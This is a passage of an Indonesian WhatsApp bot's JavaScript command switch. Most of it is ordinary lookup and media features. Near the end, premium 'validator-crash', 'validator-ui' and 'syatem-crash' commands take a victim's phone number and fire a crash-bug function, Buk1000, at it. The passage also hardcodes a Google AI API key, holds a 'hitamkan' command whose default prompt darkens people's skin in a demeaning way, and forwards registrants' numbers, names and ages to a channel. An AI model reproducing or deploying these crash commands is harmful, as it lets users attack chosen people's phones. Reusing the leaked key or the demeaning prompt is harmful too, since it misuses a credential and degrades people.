                    sourceUrl: results[0]?.link || "",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: m }
            );
          } catch (err) {
            console.log(err);
            m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
          }
        }
        break;
      case "jarak":
        {
          if (!isRegistered)
            return daftar("Kamu Belum Terdaftar, Ketik .daftar nama,umur");
          if (!text.includes("|"))
            return reply("Format Salah!\nContoh: .jarakkota Jakarta|Surabaya");

          const [from, to] = text.split("|").map((x) => x.trim());
          if (!from || !to)
            return reply("Masukkan Nama Kota Asal dan Tujuan dengan benar");

          try {
            const query = encodeURIComponent(`jarak ${from} ke ${to}`);
            const { data } = await axios.get(
              `https://www.google.com/search?q=${query}`,
              {
                headers: {
                  "User-Agent": "Mozilla/5.0",
                },
              }
            );

            const jarak = data.match(/([0-9,.]+)\s?(?:km|kilometer)/i);
            if (!jarak) return reply("Gagal Mendapatkan Data Jarak!");

            reply(`*Jarak Kota*\nDari: ${from}\nKe: ${to}\nJarak: ${jarak[0]}`);
          } catch (err) {
            console.log("JarakKota Error:", err);
            reply("Terjadi Kesalahan Saat Mengambil Data!");
          }
        }
        break;
      case "jadwaltv":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          try {
            let res = await fetch("https://api.tvmaze.com/schedule");
            let data = await res.json();
            let teks = "*[ Jadwal TV Hari Ini ]*\n\n";
            for (let i = 0; i < 10; i++) {
              let acara = data[i];
              teks += `*${acara.show.name}*\n`;
              teks += `Jam Tayang: ${acara.airtime}\n`;
              teks += `Channel: ${acara.show.network?.name || "Online"}\n\n`;
            }
            reply(teks.trim());
          } catch (e) {
            reply("Gagal Mengambil Jadwal TV");
          }
        }
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗦𝗘𝗔𝗥𝗖𝗛 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // 𝗠 𝗔 𝗜 𝗡      -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "totalfitur":
      case "totalfeature":
        {
          reply(`Total Feature HuTao Saat Ini ${totalFitur()}͏`);
        }
        break;
      case "daftar":
      case "regis":
      case "register":
        {
          if (isRegistered) return reply("ᴋᴀᴍᴜ ᴛᴇʟᴀʜ ᴛᴇʀᴅᴀғᴛᴀʀ");

          const input = text?.includes(",")
            ? text.split(",")
            : text?.includes(".")
            ? text.split(".")
            : [];
          if (input.length !== 2)
            return reply(
              "Format Salah! Gunakan: .daftar nama,umur atau .daftar nama.umur"
            );

          const nama = input[0].trim();
          const umur = input[1].trim();

          if (!nama || !umur || isNaN(umur))
            return reply("Pastikan Nama dan Umur sudah diisi dengan benar!");

          const serialUser = createSerial(20);
          const nomor = m?.sender.split("@")[0];
          const channelJid = "120363405649403674@newsletter";
          const operator = detectOperator(
            nomor
              .replace(/[^0-9]/g, "")
              .replace(/^62/, "0")
              .slice(0, 12)
          );

          const mzd =
            `${yy2}REGISTERED USERS${yy2}\n` +
            `Nomor  : @${nomor}\n` +
            `Nama   : ${nama}\n` +
            `Umur   : ${umur}\n` +
            `Status : Sukses✅\n` +
            `Serial : ${serialUser}\n` +
            `Operator: ${operator}\n` +
            `ᴠᴇʀɪғɪᴋᴀsɪ sᴛᴀᴛᴜs - sᴜᴄᴄᴇs ʏᴏᴜʀ ʏᴇs ᴀᴄᴄᴇsғᴜʟʟʏ ᴀкᴀмᴇ,,`;

          const notifLog =
            `${yy1}New Registered User${yy1}\n` +
            `Nomor   : @${nomor}\n` +
            `Nama    : ${nama}\n` +
            `Umur    : ${umur}\n` +
            `Status  : Sukses✅\n` +
            `Serial  : ${serialUser}\n` +
            `Operator: ${operator}\n` +
            `${yy2}ɪɴғᴏ ʀᴇɢɪsᴛᴇʀ ʙʏ HuTao${yy2}`;

          veri = m?.sender;
          addRegisteredUser(m?.sender, nama, serialUser);

          let ppuser;
          try {
            ppuser = await Kilianhst.profilePictureUrl(m.sender, "image");
          } catch {
            ppuser =
              "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460960720.png?q=60";
          }

          Kilianhst.sendMessage(m.chat, {
            text: mzd,
            contextInfo: {
              mentionedJid: [m.chat],
              externalAdReply: {
                showAdAttribution: true,
                title: m.isGroup ? "R E G I S T E R" : "𝗡 𝗘 𝗪 - 𝗨 𝗦 𝗘 𝗥",
                body: "",
                thumbnailUrl: ppuser,
                sourceUrl: hariini,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          });

          Kilianhst.sendMessage(channelJid, {
            text: notifLog,
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: "System Notification",
                body: "Notification Register",
                thumbnailUrl: ppuser,
                sourceUrl: "https://www.youtube.com/@KilianXdz",
                mediaType: 1,
                renderLargerThumbnail: false,
              },
            },
          });
        }
        break;

      case "anime":
        {
          if (!text)
            return m.reply("⚠️ Masukkan judul anime yang ingin dicari!");

          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "🔎", key: m.key },
            });

            let url = `https://asepharyana.cloud/api/manga/search?query=${encodeURIComponent(
              text
            )}`;
            let response = await fetch(url);
            let json = await response.json();

            if (!json || json.status !== "Ok" || !json.data.length) {
              await Kilianhst.sendMessage(m.chat, {
                react: { text: "❌", key: m.key },
              });
              return m.reply("❌ Anime tidak ditemukan!");
            }

            let results = json.data.map((anime) => ({
              title: anime.title,
              slug: anime.slug,
              poster: anime.poster,
              description: anime.description,
              anime_url: anime.anime_url,
              rating: anime.rating,
              type: anime.type,
            }));

            let responseText = `*📺 Hasil Pencarian Anime: ${text}*\n\n`;
            for (let anime of results) {
              responseText += `🎞️ *Judul:* ${anime.title}\n`;
              responseText += `⭐ *Rating:* ${anime.rating}\n`;
              responseText += `📌 *Tipe:* ${anime.type}\n`;
              responseText += `🔗 *Link:* [Klik Disini](${anime.anime_url})\n\n`;
            }

            await Kilianhst.sendMessage(m.chat, {
              react: { text: "✅", key: m.key },
            });

            await Kilianhst.sendMessage(
              m.chat,
              {
                text: responseText,
                contextInfo: {
                  externalAdReply: {
                    title: results[0].title,
                    body: "Klik untuk menonton anime",
                    thumbnailUrl: results[0].poster,
                    sourceUrl: results[0].anime_url,
                    mediaType: 1,
                  },
                },
              },
              { quoted: m }
            );
          } catch (error) {
            console.error("❌ Error:", error);
            return m.reply("❌ Terjadi kesalahan saat mengambil data anime.");
          }
        }
        break;
      case "owner":
        {
          let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp; KilianXD\nORG: Kilian\nTITLE:soft\nitem1.TEL;waid=6288286624778:6288286624778\nitem1.X-ABLabel:Ponsel\nitem2.URL:https://www.youtube.com/@KilianHost\nitem2.X-ABLabel:ðŸ’¬ More\nitem3.EMAIL;type=INTERNET: Kilianftcs@gmail.com\nitem3.X-ABLabel:Email\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABADR:ðŸ’¬ More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;
          const sentMsg = await Kilianhst.sendMessage(
            m.chat,
            {
              contacts: {
                displayName: author,
                contacts: [{ vcard }],
              },
              contextInfo: {
                externalAdReply: {
                  title: "M Y  O W N E R - K Y Y",
                  body: "JANGAN SPAM",
                  thumbnailUrl: `https://img12.pixhost.to/images/1030/577695087_Kilianxd.jpg`,
                  mediaType: 1,
                  showAdAttribution: false,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "sc":
      case "script":
      case "scbot":
        await Kilianhst.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync("./system/suara/sc.mp3"),
            viewOnce: false,
            mimetype: "audio/mpeg",
            ptt: true,
          },
          { quoted: m }
        );
        break;
      case "nulis":
      case "tulis":
        {
          if (!text)
            return m.reply(
              "❌ Masukkan teks yang ingin ditulis.\n\nExample: nulis Kilianhst Tamvan"
            );

          m.reply(mess.wait);
          const axios = require("axios");
          let apiUrl = `https://nirKilian.koyeb.app/api/v1/nulis?text=${encodeURIComponent(
            text
          )}`;

          try {
            const response = await axios.get(apiUrl, {
              responseType: "arraybuffer",
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                image: Buffer.from(response.data),
                caption: `📝 *Hasil TuKilianhstn* 📝\n\n📌 *Teks:* ${text}`,
              },
              { quoted: m }
            );
          } catch (error) {
            console.log(error);
            m.reply(`❌ Error\nLogs error : ${error.message}`);
          }
        }
        break;
      case "jkt48live":
        {
          try {
            let res = await fetch("https://michelleapi.vercel.app/jkt48/live");
            if (!res.ok) throw new Error("Error bg");

            let json = await res.json();
            if (!json.status || !json.data || !json.data.result.length) {
              return Kilianhst.sendMessage(
                m.chat,
                { text: "Gaada yang live sekarang" },
                { quoted: m }
              );
            }

            let live = json.data.result[0];
            let caption =
              `*MEMBER JKT48 LIVE*\n\n` +
              `👤 *Nama:* ${live.name}\n` +
              `📡 *Tipe:* ${live.type}\n` +
              `🎬 *Link streaming:* ${live.streaming_url_list[0].url}\n` +
              `📅 *Mulai:* ${new Date(live.started_at).toLocaleString(
                "id-ID"
              )}\n`;

            let message = {
              image: { url: live.img },
              caption: caption,
            };

            Kilianhst.sendMessage(m.chat, message, { quoted: m });
          } catch (e) {
            console.error(e);
            Kilianhst.sendMessage(
              m.chat,
              { text: "Terjadi kesalahan, coba lagi nanti 😀" },
              { quoted: m }
            );
          }
        }
        break;
      case "rangkumyt": {
        if (!text) return m.reply(`Gunakan: ${prefix}rangkumyt <url YouTube>`);
        reply(mess.wait);
        const translate = require("translate-google-api");
        async function translateText(text, lang = "id") {
          try {
            let res = await translate(text, { to: lang });
            return Array.isArray(res) ? res.join("\n") : res;
          } catch (err) {
            console.error("Error dalam terjemahan:", err);
            return "Terjadi kesalahan saat menerjemahkan.";
          }
        }
        try {
          let url = text.trim();
          let response = await fetch(
            `https://fastrestapis.fasturl.cloud/aiexperience/ytpoint?url=${url}`
          );
          let json = await response.json();

          if (!json || json.status !== 200 || !json.result) {
            return m.reply("Gagal mengambil rangkuman.");
          }

          let { short_title, summary, keyPoints } = json.result;
          let translatedSummary = await translateText(summary, "id");
          let translatedKeyPoints = [];
          for (let key of keyPoints) {
            let translatedPoint = await translateText(key.point, "id");
            let translatedDetail = await translateText(key.summary, "id");
            translatedKeyPoints.push(
              `✅ *${translatedPoint}*\n${translatedDetail}`
            );
          }
          let caption = `📌 *${short_title}*\n\n📝 *Ringkasan Video:*\n${translatedSummary}\n\n📍 *Poin Utama:*\n${translatedKeyPoints.join(
            "\n\n"
          )}`;
          m.reply(caption);
        } catch (err) {
          console.error("Error di rangkumyt:", err);
          m.reply("Terjadi kesalahan saat mengambil atau menerjemahkan data.");
        }
        break;
      }
      case "inforaya":
      case "raya":
      case "lebaran":
        {
          let targetIdulFitri = new Date("Maret 31, 2025 00:00:00");
          let targetIdulAdha = new Date("Juni 7, 2025 00:00:00");
          let currentDate = new Date();
          let remainingFitri =
            targetIdulFitri.getTime() - currentDate.getTime();
          let daysFitri = Math.floor(remainingFitri / (1000 * 60 * 60 * 24));
          let remainingAdha = targetIdulAdha.getTime() - currentDate.getTime();
          let daysAdha = Math.floor(remainingAdha / (1000 * 60 * 60 * 24));
          let countdownMessage =
            `*HITUNG MUNDUR HARI RAYA*\n\n` +
            `\`📆 Idul Fitri 2025:\`\n- 31 Maret 2025\n` +
            `- *${daysFitri} hari* lagi\n\n` +
            `\`📆 Idul Adha 2025:\`\n- 7 Juni 2025\n` +
            `- *${daysAdha} hari* lagi`;
          let img = "https://a.top4top.io/p_3353o8ph81.jpg";
          let name = m.sender;
          let fkonn = {
            key: {
              fromMe: false,
              participant: `0@s.whatsapp.net`,
              ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
            },
            message: {
              contactMessage: {
                displayName: `${await Kilianhst.getName(name)}`,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${name}\nitem1.TEL;waid=${
                  m.sender.split("@")[0]
                }:${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
              },
            },
          };
          Kilianhst.sendMessage(
            m.chat,
            {
              text: countdownMessage,
              contextInfo: {
                externalAdReply: {
                  title: `Info Hari Raya 2025`,
                  thumbnailUrl: ``,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "hitamkan":
        {
          if (!m.quoted)
            return m.reply(
              `Kirim/reply gambar dengan caption *${prefix + command}*`
            );
          const { GoogleGenerativeAI } = require("@google/generative-ai");
          let mime = m.quoted.mimetype || "";
          let defaultPrompt =
            "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

          if (!/image\/(jpe?g|png)/.test(mime))
            return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);

          let promptText = text || defaultPrompt;
          m.reply("Otw Menghitam...");

          try {
            let imgData = await m.quoted.download();
            let genAI = new GoogleGenerativeAI(
              "AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0"
            );

            const base64Image = imgData.toString("base64");

            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image,
                },
              },
            ];

            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"],
              },
            });

            const response = await model.generateContent(contents);

            let resultImage;
            let resultText = "";

            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }

            if (resultImage) {
              const tempPath = `./gemini_${Date.now()}.png`;
              fs.writeFileSync(tempPath, resultImage);

              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: tempPath },
                  caption: `*berhasil menghitamkan*`,
                },
                { quoted: m }
              );

              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch {}
              }, 30000);
            } else {
              m.reply("Gagal Menghitamkan.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "infoHuTao":
        {
          let tut = `${yy1}[ HuTao INFORMASI ]${yy1}
> HuTao Adalah Whatsaapp Bot Java Script Yang Di Buat Oleh Kilian Untuk siap Membantu Anda Dalam kebutuhan Sosial Media

${yy2}[ INFO UPDATE ]${yy2}
https://whatsapp.com/channel/0029Vb7gTNO5a2450z5MnD0k

${yy2}[ DEV SCRIPT ]${yy2}
6288286624778
`;
          await Kilianhst.relayMessage(
            m.chat,
            {
              requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: 20000000,
                requestFrom: m.sender,
                noteMessage: {
                  extendedTextMessage: {
                    text: tut,
                    contextInfo: {
                      externalAdReply: {
                        showAdAttribution: true,
                      },
                    },
                  },
                },
              },
            },
            {}
          );
        }
        break;
      case "react":
        {
          if (!m.quoted) return reply("🚩 Reply Chat!");
          if (text.length > 2) return reply("🚩Only For 1 Emoji!");
          if (!text) return reply(`📍 Usage Example :\n${usedPrefix}react 🗿`);
          Kilianhst.relayMessage(
            m.chat,
            {
              reactionMessage: {
                key: {
                  id: m.quoted.id,
                  remoteJid: m.chat,
                  fromMe: true,
                },
                text: `${text}`,
              },
            },
            { messageId: m.id }
          );
        }
        break;
      case "cekkartu":
        let nomorTag = "";

        if (m.mentionedJid && m.mentionedJid.length > 0) {
          nomorTag = m.mentionedJid[0];
        } else if (q) {
          nomorTag = q;
        } else {
          return reply(
            "Tag atau masukkan nomor HP.\nContoh: cekkartu @tagorang atau cekkartu 0896xxxxxx"
          );
        }

        // ambil nomor & normalisasi
        const nomor = nomorTag
          .replace(/[^0-9]/g, "")
          .replace(/^62/, "0")
          .slice(0, 12);
        if (nomor.length < 10) return reply("Nomor tidak valid.");

        const operator = detectOperator(nomor);
        reply(`*Nomor:* ${nomor}\n*Operator:* ${operator}`);
        break;
      case "ytstalk": {
        if (!args[0]) return m.reply("Masukkan URL channel YouTube!");
        const url = args[0];

        await m.reply("⏳ Mengambil data dari YouTube...");
        const apiUrl = `https://fgsi1-restapi.hf.space/api/information/yt-stalk?url=${encodeURIComponent(
          url
        )}`;
        const response = await axios.get(apiUrl, {
          headers: {
            "User-Agent": "Mozilla/5.0",
            Referer: "https://fgsi1-restapi.hf.space/",
          },
        });

        const data = response.data?.data;
        if (!data) return m.reply("Gagal mengambil data!");

        const {
          name,
          subscribers,
          totalVideos,
          description,
          url: channelUrl,
          avatar,
        } = data;
        const avatarUrl = avatar?.[0]?.url || "";
        const message = `📺 *YouTube Stalk*
🔹 Nama: ${name}
👥 Subscribers: ${subscribers}
🎥 Jumlah Video: ${totalVideos}
📝 Deskripsi: ${description || "-"}
🔗 URL: ${channelUrl}`;

        await Kilianhst.sendMessage(
          m.chat,
          {
            image: { url: avatarUrl },
            caption: message,
          },
          { quoted: m }
        );
        break;
      }
      case "getlirik":
        {
          if (!q) return m.reply("Lirik Lagu Apa?");
          async function getLyrics(lagunya) {
            const response = await axios.get(
              `https://www.archive-ui.biz.id/search/lirik?q=${encodeURIComponent(
                lagunya
              )}`
            );
            Kilianhst.sendMessage(
              m.chat,
              {
                image: { url: response.data.result.thumb },
                caption: `*[ HASIL SEARCH ]*\n\n- Title: ${response.data.result.title}\n- Album: ${response.data.result.album}\n- Lyrics: ${response.data.result.lyrics}`,
              },
              { quoted: m }
            );
          }

          getLyrics(q);
        }
        break;
      case "uhdpaper":
      case "swallpaper":
      case "searchwallpaper":
        {
          if (!text) return m.reply("Contoh: uhdpaper Anime,3");

          try {
            const axios = require("axios");
            const cheerio = require("cheerio");
            let [query, jumlah] = text.split(",");
            query = query.trim();
            jumlah = parseInt(jumlah) || 3;

            if (jumlah > 10) jumlah = 10;

            const res = await axios.get(
              `https://www.uhdpaper.com/search?q=${encodeURIComponent(
                query
              )}&by-date=true`,
              {
                headers: {
                  "User-Agent":
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
                  Accept: "*/*",
                },
              }
            );
            const $ = cheerio.load(res.data);
            let hasil = [];

            $(".post-outer").each((_, el) => {
              const title = $(el).find("h2").text().trim();
              const resolution = $(el).find("b").text().trim();
              const image = $(el).find("img").attr("src");
              const description = $(el).find("p").text().trim();
              const source = $(el).find("a").text().trim();
              const link = $(el).find("a").attr("href");
              hasil.push({
                title,
                resolution,
                image,
                description,
                source,
                link,
              });
            });
            if (hasil.length === 0)
              return m.reply("Gagal menemukan wallpaper.");
            if (jumlah > hasil.length) jumlah = hasil.length;
            for (let i = 0; i < jumlah; i++) {
              const w = hasil[i];
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: w.image },
                  caption: `*${w.title}*\nResolusi: ${w.resolution}\nDeskripsi: ${w.description}\nLink: ${w.link}`,
                },
                { quoted: m }
              );
            }
          } catch (e) {
            console.log(e);
            m.reply("Terjadi kesalahan saat mengambil data.");
          }
        }
        break;
      case "cekidch":
      case "idch":
        {
          if (!text) return reply("linkchnya");
          if (!text.includes("https://whatsapp.com/channel/"))
            return reply("Link tautan tidak valid");
          let result = text.split("https://whatsapp.com/channel/")[1];
          let res = await Kilianhst.newsletterMetadata("invite", result);
          let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`;
          return reply(teks);
        }
        break;
      case "dongeng":
        {
          try {
            const anu = await axios.get(
              `https://apizell.web.id/random/dongeng`
            );
            m.reply(
              `Judul Dongeng: ${anu.data.title}\n\n${anu.data.storyContent}`
            );
          } catch (err) {
            m.reply("Terjadi Kesalahan: " + err);
          }
        }
        break;
      case "cekumur":
        {
          if (!text) return m.reply("Siapa Yang Mau Di Cek Namanya?");
          try {
            const anu = await axios.get(
              `https://api.agify.io/?name=${encodeURIComponent(text)}`
            );
            m.reply(
              `\`HASIL PENGECEKAN\`\nYOUR NAME: ${anu.data.name}\nYOUR AGE: ${anu.data.age}`
            );
          } catch (err) {
            m.reply("Terjadi Kesalahan: " + err);
          }
        }
        break;
      case "tqto":
        {
          let text = `Hello @${
            m.sender.split("@")[0]
          }\n\nSaya Berterimakasih Terhadap Yang Berkaitan Bersama Scrpt HuTao Ini Berikut\n\n`;
          text += `• KilianXdz (Pengembang)\n`;
          text += `• Fallzx (Basee)\n`;
          text += `• Kayy (Donasi Fitur&friend)\n`;
          text += `• Yann (Friend)\n`;
          text += `• Jaki (Tangan Kanan)\n`;
          text += `• All User HuTao`;

          Kilianhst.sendMessage(
            m.chat,
            {
              text,
              contextInfo: {
                mentionedJid: [m.sender],
                isForwarded: true,
                externalAdReply: {
                  title: `Thanks To - Participate`,
                  body: `Thanks For`,
                  thumbnailUrl: `https://files.catbox.moe/6z7oxz.jpg`,
                  sourceUrl: `-`,
                  mediaType: 1,
                  showAdAttribution: true,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "gacha-member":
        {
          let anu = await fetch(
            "https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json"
          );
          let data = await anu.json();
          let selected = data[Math.floor(Math.random() * data.length)];
          await Kilianhst.sendMessage(m.chat, {
            image: { url: selected.image },
            caption: selected.name,
          });
        }
        break;
      case "getpic":
      case "getpp":
        {
          if (Inputo) {
            try {
              var ppuser = await Kilianhst.profilePictureUrl(Inputo, "image");
            } catch {
              var ppuser =
                "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
            }
            Kilianhst.sendMessage(
              m.chat,
              {
                image: {
                  url: ppuser,
                },
                caption: `Succes!!`,
              },
              {
                quoted: m,
              }
            );
          } else {
            try {
              var ppuser = await Kilianhst.profilePictureUrl(m.sender, "image");
            } catch {
              var ppuser =
                "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
            }
            Kilianhst.sendMessage(
              m.chat,
              {
                image: {
                  url: ppuser,
                },
                caption: `Succes!!`,
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "listchat":
        {
          const { createCanvas, loadImage } = require("canvas");
          // Aditt - Asuma Multi Device
          let a = await Kilianhst.groupFetchAllParticipating();
          let gc = Object.values(a);
          async function canlanz() {
            const startTime = Date.now();
            const canvasWidth = 720;
            const canvasHeight = 200;
            const padding = 15;
            const canvas = createCanvas(canvasWidth, canvasHeight);
            const ctx = canvas.getContext("2d");
            ctx.fillStyle = "#181818";
            ctx.fillRect(0, 0, canvasWidth, canvasHeight);
            const profileImageUrl = await Kilianhst.profilePictureUrl(
              m.sender,
              "image"
            );
            const profileImage = await loadImage(profileImageUrl);
            const imageSize = 115;
            const imageX = padding + 10;
            const imageY = (canvasHeight - imageSize) / 2;
            const borderRadius = 20;
            ctx.save();
            ctx.beginPath();
            ctx.moveTo(imageX + borderRadius, imageY);
            ctx.lineTo(imageX + imageSize - borderRadius, imageY);
            ctx.arcTo(
              imageX + imageSize,
              imageY,
              imageX + imageSize,
              imageY + borderRadius,
              borderRadius
            );
            ctx.lineTo(imageX + imageSize, imageY + imageSize - borderRadius);
            ctx.arcTo(
              imageX + imageSize,
              imageY + imageSize,
              imageX + imageSize - borderRadius,
              imageY + imageSize,
              borderRadius
            );
            ctx.lineTo(imageX + borderRadius, imageY + imageSize);
            ctx.arcTo(
              imageX,
              imageY + imageSize,
              imageX,
              imageY + imageSize - borderRadius,
              borderRadius
            );
            ctx.lineTo(imageX, imageY + borderRadius);
            ctx.arcTo(
              imageX,
              imageY,
              imageX + borderRadius,
              imageY,
              borderRadius
            );
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(profileImage, imageX, imageY, imageSize, imageSize);
            ctx.restore();
            const textX = imageX + imageSize + 20;
            const baseFontSize = canvasWidth / 25;
            const titleFontSize = Math.max(baseFontSize, 28);
            const subTextFontSize = titleFontSize * 0.65;
            const smallTextFontSize = titleFontSize * 0.6;
            const titlePaddingTop = 30;
            ctx.fillStyle = "#FFFFFF";
            ctx.font = `bold ${titleFontSize}px Inter`;
            ctx.fillText(`${pushname}`, textX, imageY + titlePaddingTop);
            const subTextPaddingTop = 40 + subTextFontSize + 5;
            ctx.fillStyle = "#D1D5DB";
            ctx.font = `${subTextFontSize}px Inter`;
            ctx.fillText(
              "XEoms Meta Client - mmk",
              textX,
              imageY + subTextPaddingTop
            );
            const chatIcon = await loadImage(
              "https://files.catbox.moe/yzcz62.png"
            );
            const chatIconSize = 26;
            const chatIconX = textX;
            const chatIconY = imageY + subTextPaddingTop + 15;
            ctx.drawImage(
              chatIcon,
              chatIconX,
              chatIconY,
              chatIconSize,
              chatIconSize
            );
            const chatTextPaddingTop = chatIconY + chatIconSize - 5;
            ctx.font = `${smallTextFontSize}px Inter`;
            ctx.fillText(
              `${gc.length} obrolan`,
              chatIconX + chatIconSize + 10,
              chatTextPaddingTop
            );
            const globeIcon = await loadImage(
              "https://files.catbox.moe/2b9s3p.png"
            );
            const globeSize = 36;
            const globeX = canvasWidth - globeSize - padding - 30;
            const globeY = (canvasHeight - globeSize) / 2;
            ctx.drawImage(globeIcon, globeX, globeY, globeSize, globeSize);
            const imagePath = "./output.png";
            const buffer = canvas.toBuffer("image/png");
            fs.writeFileSync(imagePath, buffer);
            const endTime = Date.now();
            const elapsedTime = endTime - startTime;
            Kilianhst.sendMessage(m.chat, {
              image: fs.readFileSync(imagePath),
              caption: `Speed: ${elapsedTime}ms`,
            });
          }

          canlanz().catch((err) => {
            console.error(err);
            reply("Not Found");
          });
        }
        break;
      case "motivasi":
      case "quotes-motivasi":
      case "motivasi-quotes":
        {
          let motivasii = await fetchJson(
            "https://raw.githubusercontent.com/ditss-dev/database/main/quotes/motivasi.json"
          );
          let quotesmotivasi =
            motivasii[Math.floor(Math.random() * motivasii.length)];
          const buttons = [
            {
              buttonId: `.${command}`,
              buttonText: { displayText: "Next" },
              type: 1,
            },
          ];
          const buttonMessage = {
            text: quotesmotivasi,
            footer: "Tuh Buat Lu",
            buttons,
            headerType: 1,
            viewOnce: true,
          };
          await Kilianhst.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // 𝗕 𝗨 𝗚 𝗕𝗬 𝗞 𝗬 𝗬       -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "validator-crash":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "validator-ui":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "syatem-crash":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
